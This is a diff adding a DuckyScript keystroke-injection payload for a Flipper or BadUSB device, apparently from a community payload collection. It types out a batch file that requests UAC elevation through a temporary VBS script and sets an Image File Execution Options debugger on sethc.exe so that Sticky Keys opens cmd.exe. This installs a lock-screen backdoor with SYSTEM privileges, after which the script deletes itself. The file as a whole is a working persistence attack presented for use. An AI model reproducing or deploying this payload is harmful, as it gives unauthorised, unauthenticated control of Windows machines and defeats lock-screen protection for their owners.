@@ -1,0 +1,100 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Creates a command prompt "backdoor" that can be launched in almost any "secure" Windows environment,
+REM (Lock Screen for example) via Sticky Keys shortcuts (Pressing shift five times) or the keyboard combination Alt+Shift+PrtScr.
+REM This then results in launching the command prompt in the same account as the current environment, i.e. SYSTEM or your user account.
+REM Version:	1.0
+REM Category:	Remote_Access
+REM plug in second USB in before the Flipper
+DELAY 3000
+CONTROL ESCAPE
+DELAY 500
+STRING notepad
+DELAY 250
+ENTER
+DELAY 750
+ALTSTRING @echo off
+ENTER
+ALTSTRING :init
+ENTER
+ALTSTRING setlocal DisableDelayedExpansion
+ENTER
+ALTSTRING set cmdInvoke=1
+ENTER
+ALTSTRING set winSysFolder=System32
+ENTER
+ALTSTRING set "batchPath=%~0"
+ENTER
+ALTSTRING for %%k in (%0) do set batchName=%%~nk
+ENTER
+ALTSTRING set "TEMPVBS=%temp%\OEgetPriv_run.vbs"
+ENTER
+ALTSTRING setlocal EnableDelayedExpansion
+ENTER
+ALTSTRING :checkPrivileges
+ENTER
+ALTSTRING NET FILE 1>NUL 2>NUL
+ENTER
+ALTSTRING if '%errorlevel%' == '0' (goto gotPrivileges) else (goto getPrivileges)
+ENTER
+ALTSTRING :getPrivileges
+ENTER
+ALTSTRING if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
+ENTER
+ALTSTRING echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMPVBS%"
+ENTER
+ALTSTRING echo args = "ELEV " >> "%TEMPVBS%"
+ENTER
+ALTSTRING echo For Each strArg in WScript.Arguments >> "%TEMPVBS%"
+ENTER
+ALTSTRING echo args = args ^& strArg ^& " " >> "%TEMPVBS%"
+ENTER
+ALTSTRING echo Next>> "%TEMPVBS%"
+ENTER
+ALTSTRING if '%cmdInvoke%'=='1' goto InvokeCmd
+ENTER
+ALTSTRING echo UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%TEMPVBS%"
+ENTER
+ALTSTRING goto ExecElevation
+ENTER
+ALTSTRING :InvokeCmd
+ENTER
+ALTSTRING echo args = "/c """ + "!batchPath!" + """ " + args >> "%TEMPVBS%"
+ENTER
+ALTSTRING echo UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%TEMPVBS%"
+ENTER
+ALTSTRING :ExecElevation
+ENTER
+ALTSTRING "%SystemRoot%\%winSysFolder%\WScript.exe" "%TEMPVBS%" %*
+ENTER
+ALTSTRING exit /B
+ENTER
+ALTSTRING :gotPrivileges
+ENTER
+ALTSTRING setlocal & cd /d "%~dp0."
+ENTER
+ALTSTRING if '%1'=='ELEV' (del "%TEMPVBS%" 1>nul 2>nul  &  shift /1)
+ENTER
+ALTSTRING reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /ve /f && reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f && cls && echo Payload Installed Successfully && pause && goto end
+ENTER
+ALTSTRING cls
+ENTER
+ALTSTRING echo Payload Install Failed
+ENTER
+ALTSTRING pause
+ENTER
+ALTSTRING :end
+ENTER
+ALTSTRING del /F /Q "%~0" && exit
+CONTROL s
+DELAY 500
+ALTSTRING %temp%\run.bat
+TAB
+STRING a
+ENTER
+DELAY 250
+ALT F4
+DELAY 250
+CONTROL ESCAPE
+DELAY 1500
+ALTSTRING %temp%\run.bat
+ENTER
